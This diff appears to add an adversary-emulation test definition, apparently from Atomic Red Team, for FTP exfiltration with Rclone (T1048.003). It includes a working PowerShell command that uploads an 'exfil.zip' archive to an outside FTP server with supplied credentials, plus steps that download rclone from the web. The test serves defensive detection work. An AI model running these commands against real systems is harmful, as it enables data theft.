@@ -1,0 +1,157 @@
+{
+  "id": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b",
+  "name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
+  "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "b368c585-9310-4599-aca3-06bc0382c0a9",
+      "type": "execute-command",
+      "data": {
+        "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n\u0026$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n\u0026$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c36b0810-f6e4-45c5-84e7-79de0121d14a",
+      "name": "Check dependency 1/2",
+      "description": "Check if the exfil package exists\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "2bd7bee4-e715-433a-9db9-833c01f33f51",
+      "name": "Resolve dependency 1/2",
+      "description": "Check if the exfil package exists\n",
+      "type": "execute-command",
+      "data": {
+        "command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6c108a0e-ebb0-4751-8289-a78350fd1170",
+      "name": "Re-check dependency 1/2",
+      "description": "Check if the exfil package exists\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b9286aec-a23e-493a-ad52-cd549bdea63a",
+      "name": "Check dependency 2/2",
+      "description": "Check if rclone zip exists",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "86fa06f8-f77d-43c5-8e31-4e4a3fc5e224",
+      "name": "Resolve dependency 2/2",
+      "description": "Check if rclone zip exists",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "34619b6c-0855-41f0-bf03-078c7bb4f90a",
+      "name": "Re-check dependency 2/2",
+      "description": "Check if rclone zip exists",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "c36b0810-f6e4-45c5-84e7-79de0121d14a",
+      "p": "on-success",
+      "o": "b368c585-9310-4599-aca3-06bc0382c0a9"
+    },
+    {
+      "s": "c36b0810-f6e4-45c5-84e7-79de0121d14a",
+      "p": "on-failure",
+      "o": "2bd7bee4-e715-433a-9db9-833c01f33f51"
+    },
+    {
+      "s": "2bd7bee4-e715-433a-9db9-833c01f33f51",
+      "p": "on-success",
+      "o": "6c108a0e-ebb0-4751-8289-a78350fd1170"
+    },
+    {
+      "s": "6c108a0e-ebb0-4751-8289-a78350fd1170",
+      "p": "on-failure",
+      "o": "b368c585-9310-4599-aca3-06bc0382c0a9"
+    },
+    {
+      "s": "b9286aec-a23e-493a-ad52-cd549bdea63a",
+      "p": "on-success",
+      "o": "b368c585-9310-4599-aca3-06bc0382c0a9"
+    },
+    {
+      "s": "b9286aec-a23e-493a-ad52-cd549bdea63a",
+      "p": "on-failure",
+      "o": "86fa06f8-f77d-43c5-8e31-4e4a3fc5e224"
+    },
+    {
+      "s": "86fa06f8-f77d-43c5-8e31-4e4a3fc5e224",
+      "p": "on-success",
+      "o": "34619b6c-0855-41f0-bf03-078c7bb4f90a"
+    },
+    {
+      "s": "34619b6c-0855-41f0-bf03-078c7bb4f90a",
+      "p": "on-failure",
+      "o": "b368c585-9310-4599-aca3-06bc0382c0a9"
+    }
+  ],
+  "tags": [
+    "T1048.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "ftp_port",
+      "type": "integer",
+      "description": "Your FTP's port",
+      "value": "21"
+    },
+    {
+      "name": "ftp_server",
+      "type": "string",
+      "description": "Your own ftp server",
+      "value": "ftp.dlptest.com"
+    },
+    {
+      "name": "ftp_pass",
+      "type": "string",
+      "description": "Your FTP user's password",
+      "value": "rNrKYTX9g7z3RgJRmxWuGHbeu"
+    },
+    {
+      "name": "ftp_user",
+      "type": "string",
+      "description": "Your FTP username",
+      "value": "dlpuser"
+    }
+  ]
+}
